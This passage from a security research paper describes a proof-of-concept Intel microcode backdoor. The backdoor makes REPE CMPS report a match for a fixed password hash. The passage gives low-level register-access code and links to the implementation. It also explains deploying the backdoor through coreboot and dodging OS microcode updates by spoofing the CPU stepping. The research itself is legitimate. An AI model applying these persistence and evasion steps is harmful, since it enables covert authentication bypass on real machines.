This is a load instruction. While uCodeDisasm displays it with DSZN, the
actual data size for this instruction is 32 bits. The opcode is 12 bits in
length, with the data size encoded in bits [7:6] as follows:

 00: DSZ32
 01: DSZ64
 10: DSZ16
 11: DSZ8

The instruction specifies both address and data sizes as 32-bit. This
initially caused confusion since the test CPU (Intel Pentium N4200,
Goldmont microarchitecture) is a 64-bit processor. I would expect the
microcode to operate in 64-bit mode by default. I considered this might be
a 32-bit version of the CMPS instruction. However, after thorough searching
of the MSROM, I was unable to locate any corresponding 64-bit CMPS
microcode routine.

Testing the 64-bit "REPE CMPSQ" instruction on an x86-64 Ubuntu system
confirmed that microcode routine U08b0 handles the 64-bit CMPS operation.
During my analysis, I observed that while most micro-instructions in the
MSROM use DSZ32/ASZ32, some explicitly specify ASZ64 and DSZ64. Also, the
opcode for CMPSD is "A7", while CMPSQ uses "REX.W + A7" - the same opcode
with a prefix modifier. This leads me to hypothesize that the 32-bit and
64-bit CMPS operations might share the same microcode routine, with the
REX.W prefix potentially generating a control signal that directs the
execution unit to perform either 32-bit or 64-bit comparisons as
appropriate.

It is noticeable that MOD1 (bit 44) is often set on DSZ32 and ASZ32
micro-instructions, whereas those specifying DSZ64 or ASZ64 usually do not
have MOD1 set, though exceptions exist, such as in the case of "U3d4a:
104900035924 tmp5:= MOVE_DSZ64(rsp, rsp)".

After some testing, the hypothesis seems to be correct. For example,
"SUB_DSZ32_DRR(TMP10, TMP1, TMP0) | MOD1" performs 64-bit comparisons
during "REPE CMPSQ" operations but switches to 32-bit comparisons for "REPE
CMPSD". In contrast, SUB_DSZ64_DRR(TMP10, TMP1, TMP0) maintains exclusively
64-bit comparisons, even when the upper layer operating system operates in
32-bit mode.

TMP0-TMP15 are 64-bit microarchitectural registers that can be used as
scratch registers within microcode routines. Unlike architectural registers
(such as RAX, RBX, etc.), which share a single RFLAGS register, each
microarchitectural register has its own dedicated set of arithmetic flags.
These flags are updated whenever the register is used as the destination of
an arithmetic micro-instruction.

For instance, consider the micro-operation at: "U3cce: 10050003ac31
SUB_DSZ32_DRR(TMP10, TMP1, TMP0) | MOD1". This instruction sets TMP10's Z
flag if TMP1 equals TMP0. The subsequent micro-operation: "U3cd0:
015f6410023a UJMPCC_DIRECT_TAKEN_CONDZ(tmp10, U0464)" then performs a
conditional jump based on TMP10's Z flag state.

This microcode routine is essentially what one would expect for a
comparison instruction within a loop, except that instead of using CMP, the
actual compare operation is performed by SUB, as is the case in the
OpenSPARC CPU. Yet, despite the brevity of this code segment, several
unresolved mysteries remain.

For instance, what is the purpose of SIGEVENT(0x0000003b)? Why would the
code send a signal immediately after checking the RCX register, before
there is even a chance to trigger an access violation? Furthermore, if the
subsequent LDZX_DSZN_ASZ32_SC1 operation accesses an illegal virtual
address, should signals be generated then? Since the exact function of
SIGEVENT remains unclear, the hook has been placed at U3cc8 instead of the
cmps entry point U08b0 to avoid unintended side effects.


--[ 3.4.3 CMPS Backdoor Implementation

Now let's break down how this CMPS backdoor actually works. The mechanism
is straightforward: when executed, it checks the memory location pointed to
by RDI. If this value matches our predefined backdoor hash, the REPE CMPS
instruction will set the Z flag in RFLAGS, falsely indicating string
equivalence. Additionally, RCX must be cleared to zero, while RSI and RDI
should be properly incremented or decremented based on the D flag. This
adjustment is necessary because Windows' 64-bit RtlCompareMemory function
determines string equality length using these register values. Again, we
are using the hash '3dbde697d71690a769204beb12283678' (corresponding to
password '123') for this experiment. To use less MSRAM space, the
implementation compares only on the first 64 bits of the hash value, which
is 0xa79016d797e6bd3d.

The following microcode utilizes lib-micro[27] for writing to MSRAM and the
Match/Patch registers. Its IN instruction microcode patch is essential for
sustaining persistent microcode hooks. The forked version of lib-micro
includes the CMPS backdoor implementation. Full source code is accessible
at: https://github.com/whensungoesdown/lib-micro

This project compiles and executes on Linux systems with CPU red unlocked,
intended for testing and research purposes. The CMPS microcode hook remains
effective even in virtualized environments using Intel VMX technology, as
virtual machines execute most instructions (including CMPS) directly on the
physical host CPU. This makes it convenient to test the backdoor's effects
on a Windows system running inside a KVM/QEMU virtual machine.

<PRE>

Initially, I used LDZX_DSZ64_ASZ64_SC8_DR(TMP1, RDI, 0x08) to read the
first 64-bit value. The testing environment was a 32-bit Windows 10
KVM/QEMU virtual machine. While the backdoored cmps instruction functioned
correctly during the Windows login process, issues arose during the early
boot stage after a system reboot. To resolve this, I switched to using
LDZX_DSZ32_ASZ32_SC1_DR(TMP1, RDI, 0x08) | MOD1, as previously described. A
likely reason for this behavior is that DSZ64/ASZ64 instructions are
incompatible with the real-mode execution environment present during early
boot stages.

The implementation is hardcoded to hook at U3cc8, where the original triad
is copied to be executed before branching to the next triad. This microcode
is specific to the Intel N4200 (family 06, model 92) stepping 10, as CPUs
of the same model with different steppings may have MSROM variations due to
accumulated microcode patches.


--[ 3.4.4 Installing Microcode Backdoors via Coreboot

As introduced earlier, the attack scenario assumes that the CPU vendor
implants a backdoor in the silicon during production. In the context of
microcode, the vendor could either embed malicious microcode in the MSROM
at the factory or distribute a harmful microcode patch to update all CPUs
of the same model. This patch would load every time the system boots,
placing the malicious code in the MSRAM. To validate this concept and
closely emulate the vendor's actions, the most feasible approach is to
embed the backdoor code in the BIOS and patch the microcode during each
system boot.

When Mark Ermolov, Dmitry Sklyarov, and Maxim Goryachy achieved the "Red
Unlock" on an Intel Goldmont microarchitecture CPU, they used a Gigabyte
NUC (model GB-BPCE-3350C) as their test machine. Later, KaKaRoTo continued
this work on a Beelink-M1 NUC[28]. Subsequently, Alexander Krog and
Alexander Skovsende released the lib-micro project, rewriting the exploit
for their own machine, which I believe was an UP Squared Pro N4200.

If you want to replicate this, you will likely need an Intel Silicon View
Technology Closed Chassis Adapter (SVTCCA) to debug the Management Engine
(ME) code. Otherwise, the best option is to find the exact same hardware
and use the existing exploit.

For my setup, I got Red Unlock working using their pre-built firmware.
Although lib-micro's coreboot image did not boot on my UP Squared (Pro)
board, but their exploit worked. As a workaround, I recompiled Coreboot
with extracted modules.

My Coreboot fork, including the CPU backdoor, is available at:
https://github.com/whensungoesdown/coreboot

It also provides a Coreboot pre-built image that enables Red Unlock, loads
the CPU backdoor microcode, and fixes the VGA driver. I tested it on an UP
Squared Pro N4200 (the 4GB RAM/32GB storage version). The coreboot and red
unlock part should work fine on both UPSquared and UPSquared Pro boards,
since there is not much difference between them. That said, if you've got a
UPSquared board, you're probably looking at an N4200 stepping 9 CPU.
Welcome to the 0x0 Bytes Left Club, see section 3.4.5.

The microcode part is unchanged from the previous test project. The
firmware implementation now requires loading this microcode on all CPU
cores. One optimal place appears to be cpu_initialize() in arch/x86/cpu.c,
as this is where coreboot applies the official microcode updates. The
backdoor microcode patch should then be applied afterward.

For simplicity, the CPU backdoor only compromises the CMPS instruction as
previously described. But there is one issue. When attempting to install a
newer version of Windows 10 (22H2, far more recent than the Intel N4200's
release), the installer crashes with a MICROCODE_REVISION_MISMATCH
bluescreen. Nice one, Microsoft.

In contrast, Ubuntu 24.04 silently installs the microcode patch and removes
the backdoor hooks without any warning.

For CPU vendors, this should not be a concern as they control all microcode
updates. For others, there is a solution: hooking the CPUID instruction and
altering the stepping number, tricking the OS into believing the CPU is
much newer, thus avoiding microcode updates.

For example, testing on an older Windows 10 version (2016 release) works
flawlessly: no installation errors, and the backdoor remains intact.
However, altering the stepping number leaves a detectable trace. But
seriously, who pays attention to that?

--[ 3.4.5 The 0x0 Bytes Left Club

During implementation and testing, two Intel N4200 processors were used,
stepping 9 and 10. Clearly, the stepping 9 is an earlier iteration. It uses
all available microcode RAM and takes 28 out of the 32 match/patch
registers, as listed below.

Match/patch table is implemented as one of Microcode Sequencer
Arrays (array 3), with the following structure:

  30                    16 15                       0
 +------------------------+------------------------+-+

 +------------------------+------------------------+-+
            15                        15            1

 p  : Indicates whether the entry is active
 src: 15-bit source address (calculated as uaddr/2) representing the hook
      location
 dst: 15-bit destination address (calculated as uaddr/2) for the jump
      target


This component plays a critical role in the microcode update system. During
microcode execution, when the processor encounters an instruction at the
src address, the control flow is redirected to the corresponding dst
address, enabling runtime modification of the execution path. The table
contains 32 entries, with the first entry typically reserved/unused.

The MSRAM is completely filled up to 0x7df6 (as shown in slot 28), and the
whole space stops at 0x7dff in case I didn't mention that before.  It
leaves no space to insert more microcode. At first, I assumed microcode
patches were incrementally applied with each update. To test this, I
disabled microcode updates in the Linux kernel and even removed the
microcode blob from coreboot. Surprisingly, the microcode RAM became even
more saturated, and one more match/patch register was occupied.

This means that if you are using stepping 9 (or an even earlier revision,
if one exists) this experiment may not be feasible. To free up space, I
attempted to erase certain match/patch registers, assuming that
security-related patches would have minimal impact. However, the system
became unstable. Shows these microcode patches are more serious than I
thought.

According to Coreboot doc, "When a CPU core comes out of reset, it uses
microcode from an internal ROM. This "default" microcode often contains
bugs, so it needs to be updated as soon as possible. For example, Core 2
CPUs can boot without microcode updates, but have stability problems. On
newer platforms, it is nearly impossible to boot without having updated the
microcode. On some platforms, an updated microcode is required in order to
enable Cache-As-RAM or to be able to successfully initialize the DRAM.
Plus, microcode needs to be loaded multiple times. Intel Document 504790
explains that this is because of so-called enhanced microcode updates,
which are large updates with errata workarounds for both core and uncore.
In order to correctly apply enhanced microcode updates, the MP-Init
algorithm must be decomposed into multiple initialization phases.
...
Beginning with 4th generation Intel Core processors, it is possible for
microcode to be updated before the CPU is taken out of reset. This is
accomplished by means of FIT, a data structure which contains pointers to
various firmware ingredients in the BIOS flash."

Microcode updates are not optional especially those FIT ones in BIOS,
because modern CPUs need them to even work right. To mess up a CPU with
heavy microcode patches, maybe the only way is to analysis it, find gaps
and squeeze code pieces in there like old-school infection virus.

For this project, it would be much easier to start with a CPU that is
stepping 10, there should be enough space to implant the backdoor
microcode. Below is the current match/patch status for stepping 10 under
microcode revision 0x28.

--[ 3.4.6 CRBUS, LDAT and Memory Arrays

An important aspect need to be covered is how data is read from MSROM and
written to MSRAM. These operations rely on two critical components: CRBUS
and LDAT. Since I'm still learning about these systems myself, I'll explain
them to the best of my understanding.

It makes sense for a processor to have an internal bus capable of
monitoring the status of all its components. Such a bus would be essential
for tasks like resetting hardware to predefined states, enabling or
disabling specific features, and reading diagnostic data. While not
documented in public specifications, these internal buses appear to exist
across major architectures, such as Intel CRBUS (Configuration Register
Bus) and IBM PIB (Pervasive Interconnect Bus).

The CRBUS can be accessed through multiple interfaces[31]. One method is
via the TAP (Test Access Port) which is a logic block responsible for
executing tests and managing data flow along the boundary cells. In
practice, this is commonly referred to as JTAG access.

The following CRBUS read/write implementation is extracted from the TXE-POC
project [23]:

</PRE>
```c
 def crbus_read(addr):
     glm0 = ipc.devs.glm_module0
     crbus_val = (0x3 << 79) | (addr << 65)
     ipc.irdrscan(glm0, 0xa8, 83, None, crbus_val, False)
     val = ipc.irdrscan(glm0, 0xa9, 83)
     data = (val & ((1 <<  0x41) - 1)) >> 1
     return data

 def crbus_write(addr, val):
     glm0 = ipc.devs.glm_module0
     crbus_val = (0x1 << 80) | (addr << 65) | ((val &((1 << 64 ) -1)) << 1)
     ipc.irdrscan(glm0, 0xa8, 83, None, crbus_val, False)
```
<PRE>

The implementation utilizes ipccli lib's irdrscan function (from Intel
System Studio) which performs combined IR/DR scan operations through the
JTAG interface.

</PRE>
```text
 irdrscan(device, instruction, bitCount, data=None, writeData=None,
          returnData=True)

   Perform a combined IR/DR scan to the specified device, passing in the
   specified instruction for the IR scan and the specified bit count for
   the DR scan.

   Parameters
     device (int) – the did or alias of the device (not needed if using
                    from a node object).

     instruction (int) – The instruction to scan into the device.

     bitCount (int) – The number of bits to scan from the data register of
                      the designated device as selected by the current
                      instruction register handle.

     data (int) – can specify this or writeData with a number or BitData
                  object to write to the device (see note about backwards
                  compatibility).

     writeData (int) – a number or BitData object to write to the device.

     returnData (bool) – whether to return the data from the scan that was
                         done.

   Returns
     A BitData object containing the bits that were read back.
```
<PRE>

The second parameter specifies the instruction to be scanned into the
device. While the exact meaning of the "0xa8" used in the Python code above
seems to be undocumented, it may correspond to "CRBUS" instruction as
referenced in a Intel patent[31]."

According to the patent, the CRBUS consists of one 32-bit CR DATA BUS and
10-bit CR ADDRESS & W/R BUS. Two different TAP instructions, "CRBUS" and
"CRBUSNOGO", have been designed to perform the necessary accessing of
control registers. The CRBUS command instructs the TAP to access the
appropriate location and if it is a "write", to write the data to the
accessed register. If the operation is a "read," then the CRBUS command
instructs data to be read from the accessed register. The CRBUSNOGO
instruction is used (along with the CRBUS instruction) only for a read
operation, to shift the data out as a serial TDO signal.

The referenced patent dates back to 2000, and modern implementations may
differ significantly. For instance, the MSROM includes numerous control
registers with addresses exceeding 10 bits. For current analysis, we can
just treat CRBUS as an interconnect for accessing control registers
distributed across the chip.

An alternative method for accessing CRBUS is via the undocumented
instructions UDBGRD and UDBGWR, as disclosed by researchers Mark Ermolov,
Dmitry Sklyarov, and Maxim Goryachy and implemented in lib-micro. The
relevant code snippet is provided below.

</PRE>
```c
 __attribute__((always_inline))
 u_result_t static inline udbgrd(uint64_t type, uint64_t addr) {
     lmfence();
     u_result_t res;
     asm volatile(
         ".byte 0x0F, 0x0E\n\t"
         : "=d" (res.value)
         , "=b" (res.status)
         : "a" (addr)
         , "c" (type)
     );
     lmfence();
     return res;
 }

 __attribute__((always_inline))
 u_result_t static inline udbgwr(uint64_t type, uint64_t addr,
                                                uint64_t value) {
     uint32_t value_low = (uint32_t)(value & 0xFFFFFFFF);
     uint32_t value_high = (uint32_t)(value >> 32);
     u_result_t res;
     lmfence();
     asm volatile(
         ".byte 0x0F, 0x0F\n\t"
         : "=d" (res.value)
         , "=b" (res.status)
         : "a" (addr)
         , "c" (type)
         , "d" (value_low)
         , "b" (value_high)
     );
     lmfence();
     return res;
 }
```
<PRE>

The opcodes for UDBGRD and UDBGWR are 0F0E and 0F0F, respectively.
Referring back to the opcode map in Section 2, the last two cells of the
first row are unassigned, indeed, these correspond to undocumented
instructions.

The RCX register specifies the target device to access. A value of 0x0
corresponds to the CRBUS, while 0x10 indicates URAM, which is a private
memory region exclusive to a single CPU core and not shared with others.
For CRBUS read or write operations, the RAX register holds the address of
the target control register.

For MSROM reads or MSRAM writes, the relevant control registers belong to
LDAT (Large Data Array Testing[29] or Local Direct Access Test[30]). As the
name suggests, the LDAT engine manages large data arrays.

The engine has four registers: SDAT, PDAT, DATIN, and DATOUT[29][32]. By
configuring SDAT/PDAT with address, array, bank, and other parameters,
specific memory arrays can be read or written. It is unclear to me how this
was reverse-engineered, whether through direct analysis or by referencing
some XML files containing register address definitions. Previous
research[30][32][27][33] provides these definitions, which I include here
for easy reference.

Some control registers are not listed above. For example, set/unset bit-0
of 0x692 to disable/enable the match/patch mechanism. And, writing 0 to
0x38C halts frontend instruction fetching.

The Microcode Sequencer utilizes five memory arrays. As previously
described, array 3 stores the match/patch table. Arrays 0 and 1 form the
microcode ROM space, spanning addresses 0x0000 through 0x7BFF. The writable
RAM space consists of Arrays 2 and 4, occupying the address range from
0x7C00 to 0x7DFF for microcode updates.

Arrays 0 and 4 store microcode triads, with each entry consisting of three
micro-operations and one unused field. For example, partial dump from array
0:

 addr   uop0         uop1         uop2         unused
 0000:  00626803f200 000801030008 004800013000 000000000000
 0004:  05b900013000 000a01000200 014800000000 000000000000
 0008:  000c6c97e208 0005a407de08 01310023d23d 000000000000
 000c:  00470003dc7d 0150015c027d 000000000000 000000000000
 ...
 7bfc:  000000000000 000000000000 000004d3ebf4 000000000000


Each microcode triad comprises three micro-instructions located at
consecutive addresses (e.g., 0x0000-0x0002), with the fourth position
consistently unused and zeroed. Array 4 maintains an identical structure
for the writable microcode RAM space.

Arrays 1 and 2 contain the sequence words that correspond to each microcode
triad. As shown in this partial dump from array 1:

 addr   seqw
 0000:  0000018e5e40 0000018e5e40 0000018e5e40 0000018e5e40
 0004:  00000b000240 00000b000240 00000b000240 00000b000240
 0008:  000001890900 000001890900 000001890900 000001890900
 000c:  000006a71180 000006a71180 000006a71180 000006a71180
 ...
 7bfc:  0000018000c0 0000018000c0 0000018000c0 0000018000c0


This quadruple repetition occurs because only one sequence word is needed
per microcode triad and the addressing scheme for sequence word access may
use (Uaddr >> 2) as the index. The design likely enables parallel fetching
of both microcode triads and their corresponding sequence words by
maintaining address alignment between the two structures.

For the CMPS backdoor, if the pre-built coreboot image is correctly flashed
onto the board, the following logs will appear in the serial console during
boot. These logs demonstrate how the malicious microcode takes over the
MSRAM.

In the match/patch table, the last two entries are occupied: one
corresponds to the backdoor hook (previously described, though with a
different offset due to CPU stepping), and the other is the IN instruction
microcode patch, which is critical for maintaining persistent microcode
hooks.

AVX (Advanced Vector Extensions) is a feature in modern Intel and AMD
processors that speeds up computations by processing multiple data elements
at once. It uses special 256-bit registers (YMM) to perform SIMD (Single
Instruction, Multiple Data) operations, making tasks like multimedia
processing and scientific calculations much faster.

In the GNU C Library (glibc), functions like strcmp() have multiple
optimized variants, each designed to take advantage of specific CPU
instruction sets, as illustrated in the code snippet below:

</PRE>
```c
/* Support sysdeps/x86_64/multiarch/strcmp.c.  */
IFUNC_IMPL (i, name, strcmp,
            IFUNC_IMPL_ADD (array, i, strcmp,
                            HAS_ARCH_FEATURE (AVX2_Usable),
                            __strcmp_avx2)
            IFUNC_IMPL_ADD (array, i, strcmp, HAS_CPU_FEATURE (SSE4_2),
                            __strcmp_sse42)
            IFUNC_IMPL_ADD (array, i, strcmp, HAS_CPU_FEATURE (SSSE3),
                            __strcmp_ssse3)
            IFUNC_IMPL_ADD (array, i, strcmp, 1, __strcmp_sse2_unaligned)
            IFUNC_IMPL_ADD (array, i, strcmp, 1, __strcmp_sse2))
```
<PRE>

This mechanism, called IFUNC (Indirect Function) [17], is a GNU toolchain
feature that allows multiple function implementations to be selected at
runtime via a resolver. The dynamic loader invokes this resolver during
startup to choose the optimal version (e.g., AVX2), which then remains
fixed for the process's lifetime.

String comparison using AVX2 is performed through vectorized operations
where two 256-bit ymm registers are compared using VPCMPEQ. As each ymm
register holds 32 bytes (VEC_SIZE), this allows comparing 32-byte string
chunks in a single operation. For example:

</PRE>
```asm
vmovdqu (%rdi),%ymm1
vpcmpeqb (%rsi),%ymm1,%ymm0
```
<PRE>

The vmovdqu instruction loads 32 bytes from the memory address in RDI into
YMM1. The vpcmpeqb instruction then compares these 32 bytes against the
contents at RSI's memory address, storing the comparison result in YMM0.
Each byte position in YMM0 is set to 0xFF (all 1s) for matching bytes or
0x00 (all 0s) for mismatches.

The string comparison is performed using vpcmpeqb rather than traditional
CMPS instructions. From the backdoor's perspective, this approach is more
advantageous because these extended instruction sets are specialized and
less frequently used than basic x86 instructions. Additionally, vpcmpeqb
can compare significantly more bytes in a single operation, making it
easier to identify the target hash string while minimizing the risk of
accidental triggers. Note, complex instruction like vpcmpeqb are typically
implemented through microcode.


----[ 4.2 Other Thoughts

In a computer system, trust is rooted in the firmware. Upon startup, the
CPU runs immutable code stored in ROM or OTPROM (One-Time Programmable
ROM), which authenticates the next firmware stage through digital signature
verification. This process typically relies on asymmetric cryptography,
such as RSA. The subsequent firmware is signed with a private key, while
the ROM contains the corresponding public key to validate its integrity.
Together, this immutable ROM code and embedded public key form the root of
trust for the system.

In practice, the OTPROM has limited capacity. Consequently, instead of
storing the entire public key, only its hash is kept in OTPROM, while the
full public key resides in external storage (e.g., EEPROM or FLASH). Thus,
the ROM code's first step is to fetch the public key and verify its hash
against the one stored in ROM. This comparison establishes the root of
trust.

After successfully authenticating the root public key, the system proceeds
to validate the next stage firmware's digital signature. To understand how
digital signatures work, let's take RSA (specifically, the
RSASSA-PKCS1-V1_5 scheme) as an example. Suppose we have the firmware bin,
that needs to be verified, along with its digital signature, bin_sig. The
verification process uses the signer's public key to confirm that the
signature is valid and the data has not been altered.

1. Hash the input data: Compute the SHA-256 digest of the original data
   ("bin"):

   hash = sha256(bin);

2. Encode the hash: Format the hash according to the EMSA-PKCS1-v1_5
   padding scheme (which does not use salt):

   hash_encode = EMSA-PKCS1-v1_5(hash);

3. Decrypt the signature: Use the RSA public key to decrypt "bin_sig",
   get the encoded hash:

   hash_encode_from_sig = rsa_decrypt(bin_sig, public_key);

4. Compare the hashes: Verify the signature by checking if the decrypted
   encoded hash matches the locally computed encoded hash:

   cmp(hash_encode_from_sig, hash_encode);


The final hash comparison decides whether verification passes or fails.

So far, the system has performed two hash string comparisons. But what if
the CPU recognizes even a single one of these hashes? This could break the
trust chain, allowing the execution of malicious code.

In practice, storing just a few hash strings in the CPU is not particularly
useful because a single hash only represents one digital signature. Now,
consider if the hash function had an algorithmic backdoor: one that
produces detectable patterns when processing specially crafted inputs (such
as those beginning with a particular header sequence). The CPU could detect
this pattern during string comparison and let the malicious hash to pass
authentication.

I'm not certain whether this is feasible, but it's certainly an interesting
idea to explore.


--[ 5. Conclusion

This paper introduces a CPU backdoor that enables an attacker to log into
any account on the system using a master password.

To test the idea, three prototypes are built: one on the QEMU TCG emulator,
another on the OpenSPARC T1 processor (FPGA-based), and a third via
microcode modification on an Intel Pentium N4200 CPU.

The idea we aim to convey is this: while embedding backdoors deeper into
hardware improves stealth, hardware alone imposes usability constraints.
However, if the software intentionally cooperates the hardware, we gain
more opportunities to deploy effective CPU backdoors. In our approach, the
upper-layer operating system's password authentication module exhibits
detectable behavioral patterns, which the CPU monitors to infer
authentication events.
